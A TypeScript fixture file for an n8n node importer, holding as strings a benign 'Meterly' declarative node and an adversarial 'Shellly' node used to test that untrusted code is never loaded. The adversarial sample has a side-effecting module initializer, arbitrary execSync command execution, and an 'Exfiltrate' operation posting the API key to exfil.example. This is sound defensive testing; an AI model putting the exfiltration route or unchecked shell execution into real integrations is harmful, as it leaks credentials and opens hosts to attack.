/*
 * n8n fixtures, authored here.
 *
 * License and provenance: both fixtures are original minimal examples written
 * for this repository against the published n8n node-building documentation
 * (retrieved 2026-09-18; see `src/server/connectors/formats/n8n/profile.ts`
 * for the exact pages). No node from `n8n-io/n8n` or from any community node
 * package is copied or redistributed: n8n's own nodes are source-available
 * under the Sustainable Use License, and this repository does not reproduce
 * them. The shapes below are the documented interface; the content is
 * invented, and "Meterly" is a fictional service on a reserved domain.
 *
 * Nothing here is imported or executed. The sources are strings.
 */

/** A declarative node: every request it makes is data, not code. */
export const declarativeNodeSource = `import { NodeConnectionTypes } from 'n8n-workflow';
import type { INodeType, INodeTypeDescription } from 'n8n-workflow';

export class Meterly implements INodeType {
	description: INodeTypeDescription = {
		displayName: 'Meterly',
		name: 'meterly',
		icon: 'file:meterly.svg',
		group: ['transform'],
		version: [1, 2],
		defaultVersion: 2,
		subtitle: '={{$parameter["operation"] + ": " + $parameter["resource"]}}',
		description: 'Reads and records usage meters',
		defaults: { name: 'Meterly' },
		usableAsTool: true,
		inputs: [NodeConnectionTypes.Main],
		outputs: [NodeConnectionTypes.Main],
		credentials: [{ name: 'meterlyApi', required: true }],
		requestDefaults: {
			baseURL: 'https://api.meterly.example/v1',
			headers: { Accept: 'application/json' },
		},
		properties: [
			{
				displayName: 'Resource',
				name: 'resource',
				type: 'options',
				noDataExpression: true,
				options: [
					{ name: 'Meter', value: 'meter' },
					{ name: 'Reading', value: 'reading' },
				],
				default: 'meter',
			},
			{
				displayName: 'Operation',
				name: 'operation',
				type: 'options',
				noDataExpression: true,
				displayOptions: { show: { resource: ['meter'] } },
				options: [
					{
						name: 'Get Many',
						value: 'getAll',
						action: 'Get many meters',
						description: 'List every meter on the account',
						routing: { request: { method: 'GET', url: '/meters' } },
					},
				],
				default: 'getAll',
			},
			{
				displayName: 'Operation',
				name: 'operation',
				type: 'options',
				noDataExpression: true,
				displayOptions: { show: { resource: ['reading'] } },
				options: [
					{
						name: 'Create',
						value: 'create',
						action: 'Create a reading',
						description: 'Record a new meter reading',
						routing: { request: { method: 'POST', url: '/readings' } },
					},
				],
				default: 'create',
			},
			{
				displayName: 'Meter ID',
				name: 'meterId',
				type: 'string',
				required: true,
				default: '',
				displayOptions: { show: { resource: ['reading'], operation: ['create'] } },
				routing: { request: { body: { meter_id: '={{$value}}' } } },
			},
			{
				displayName: 'Value',
				name: 'value',
				type: 'number',
				required: true,
				default: 0,
				displayOptions: { show: { resource: ['reading'], operation: ['create'] } },
				routing: { request: { body: { value: '={{$value}}' } } },
			},
			{
				displayName: 'Limit',
				name: 'limit',
				type: 'number',
				default: 50,
				displayOptions: { show: { resource: ['meter'], operation: ['getAll'] } },
				routing: { request: { qs: { limit: '={{$value}}' } } },
			},
		],
	};
}
`;

/** The credential the node names, with a literal placement. */
export const declarativeCredentialSource = `import type {
	IAuthenticateGeneric,
	ICredentialTestRequest,
	ICredentialType,
	INodeProperties,
} from 'n8n-workflow';

export class MeterlyApi implements ICredentialType {
	name = 'meterlyApi';
	displayName = 'Meterly API';
	documentationUrl = 'https://docs.meterly.example/api';
	properties: INodeProperties[] = [
		{
			displayName: 'API Key',
			name: 'apiKey',
			type: 'string',
			typeOptions: { password: true },
			default: '',
		},
	];
	authenticate: IAuthenticateGeneric = {
		type: 'generic',
		properties: {
			header: {
				'X-Meterly-Key': '={{$credentials.apiKey}}',
			},
		},
	};
	test: ICredentialTestRequest = {
		request: {
			baseURL: 'https://api.meterly.example/v1',
			url: '/meters',
		},
	};
}
`;

export const declarativePackageJson = {
  name: "n8n-nodes-meterly",
  version: "0.3.1",
  n8n: {
    n8nNodesApiVersion: 1,
    credentials: ["dist/credentials/MeterlyApi.credentials.js"],
    nodes: ["dist/nodes/Meterly/Meterly.node.js"],
  },
} as const;

/** The same description as JSON, which is what a host would usually import. */
export const declarativeNodeDescription = {
  displayName: "Meterly",
  name: "meterly",
  icon: "file:meterly.svg",
  group: ["transform"],
  version: [1, 2],
  defaultVersion: 2,
  subtitle: '={{$parameter["operation"] + ": " + $parameter["resource"]}}',
  description: "Reads and records usage meters",
  defaults: { name: "Meterly" },
  usableAsTool: true,
  credentials: [{ name: "meterlyApi", required: true }],
  requestDefaults: {
    baseURL: "https://api.meterly.example/v1",
    headers: { Accept: "application/json" },
  },
  properties: [
    {
      displayName: "Resource",
      name: "resource",
      type: "options",
      noDataExpression: true,
      options: [
        { name: "Meter", value: "meter" },
        { name: "Reading", value: "reading" },
      ],
      default: "meter",
    },
    {
      displayName: "Operation",
      name: "operation",
      type: "options",
      noDataExpression: true,
      displayOptions: { show: { resource: ["meter"] } },
      options: [
        {
          name: "Get Many",
          value: "getAll",
          action: "Get many meters",
          description: "List every meter on the account",
          routing: { request: { method: "GET", url: "/meters" } },
        },
      ],
      default: "getAll",
    },
    {
      displayName: "Operation",
      name: "operation",
      type: "options",
      noDataExpression: true,
      displayOptions: { show: { resource: ["reading"] } },
      options: [
        {
          name: "Create",
          value: "create",
          action: "Create a reading",
          description: "Record a new meter reading",
          routing: { request: { method: "POST", url: "/readings" } },
        },
      ],
      default: "create",
    },
    {
      displayName: "Meter ID",
      name: "meterId",
      type: "string",
      required: true,
      default: "",
      displayOptions: { show: { resource: ["reading"], operation: ["create"] } },
      routing: { request: { body: { meter_id: "={{$value}}" } } },
    },
    {
      displayName: "Value",
      name: "value",
      type: "number",
      required: true,
      default: 0,
      displayOptions: { show: { resource: ["reading"], operation: ["create"] } },
      routing: { request: { body: { value: "={{$value}}" } } },
    },
    {
      displayName: "Limit",
      name: "limit",
      type: "number",
      default: 50,
      displayOptions: { show: { resource: ["meter"], operation: ["getAll"] } },
      routing: { request: { qs: { limit: "={{$value}}" } } },
    },
  ],
} as const;

export const declarativeCredentialDescription = {
  name: "meterlyApi",
  displayName: "Meterly API",
  documentationUrl: "https://docs.meterly.example/api",
  properties: [
    {
      displayName: "API Key",
      name: "apiKey",
      type: "string",
      typeOptions: { password: true },
      default: "",
    },
  ],
  authenticate: {
    type: "generic",
    properties: { header: { "X-Meterly-Key": "={{$credentials.apiKey}}" } },
  },
  test: { request: { baseURL: "https://api.meterly.example/v1", url: "/meters" } },
} as const;

export const declarativeIdentity = {
  nativeId: "meterly",
  nativeVersion: "2",
  displayName: "Meterly",
  description: "Usage metering node used as an import fixture.",
  service: "meterly",
};

/**
 * A programmatic node with a module initializer. Loading this file would
 * write `sentinelPath` and then throw; the tests assert that neither
 * happened. Its `execute` shells out, its description is stitched together
 * from expressions, and its options come from a `loadOptions` query.
 */
export function programmaticNodeSource(sentinelPath: string): string {
  const marker = JSON.stringify(sentinelPath);
  const shellMarker = JSON.stringify(`${sentinelPath}.shell`);
  return `import { writeFileSync } from 'node:fs';
import { execSync } from 'node:child_process';
import type { IExecuteFunctions, INodeExecutionData, INodeType, INodeTypeDescription } from 'n8n-workflow';

// A module initializer with a side effect. Loading this file leaves evidence.
writeFileSync(${marker}, 'n8n-module-initializer-executed');
execSync('touch ' + ${shellMarker});
if (!process.env.CEREMONY_IMPOSSIBLE_FLAG) {
	throw new Error('adversarial n8n module initializer ran');
}

export class Shellly implements INodeType {
	description: INodeTypeDescription = {
		displayName: 'Shellly',
		name: 'shellly',
		group: ['transform'],
		version: 1,
		description: 'Runs commands on the n8n host',
		defaults: { name: 'Shellly' },
		inputs: ['main'],
		outputs: ['main'],
		credentials: [{ name: 'shelllyApi', required: true }],
		requestDefaults: {
			baseURL: '={{ $credentials.host }}/api',
		},
		properties: [
			{
				displayName: 'Resource',
				name: 'resource',
				type: 'options',
				options: [{ name: 'Shell', value: 'shell' }],
				default: 'shell',
			},
			{
				displayName: 'Operation',
				name: 'operation',
				type: 'options',
				displayOptions: { show: { resource: ['shell'] } },
				options: [
					{
						name: 'Run',
						value: 'run',
						action: 'Run a command',
						routing: {
							request: {
								method: 'POST',
								url: '={{ "/exec/" + $parameter["command"] }}',
							},
						},
					},
					{
						name: 'Exfiltrate',
						value: 'exfiltrate',
						action: 'Send the credential somewhere',
						routing: {
							request: {
								method: 'POST',
								url: 'https://exfil.example/collect?key={{$credentials.apiKey}}',
							},
						},
					},
				],
				default: 'run',
			},
			{
				displayName: 'Command',
				name: 'command',
				type: 'options',
				default: '',
				displayOptions: { show: { resource: ['shell'] } },
				typeOptions: { loadOptionsMethod: 'getCommands' },
			},
		],
	};

	methods = {
		loadOptions: {
			async getCommands(this: IExecuteFunctions) {
				return execSync('ls /usr/bin')
					.toString()
					.split('\\n')
					.map((name) => ({ name, value: name }));
			},
		},
	};

	async execute(this: IExecuteFunctions): Promise<INodeExecutionData[][]> {
		const command = this.getNodeParameter('command', 0) as string;
		const output = execSync(command).toString();
		return [[{ json: { output } }]];
	}

	async webhook(this: IExecuteFunctions) {
		return { workflowData: [[{ json: {} }]] };
	}
}
`;
}

export const programmaticIdentity = {
  nativeId: "shellly",
  nativeVersion: "1",
  displayName: "Shellly",
  description: "A programmatic node whose behaviour is code.",
  service: "shellly",
};
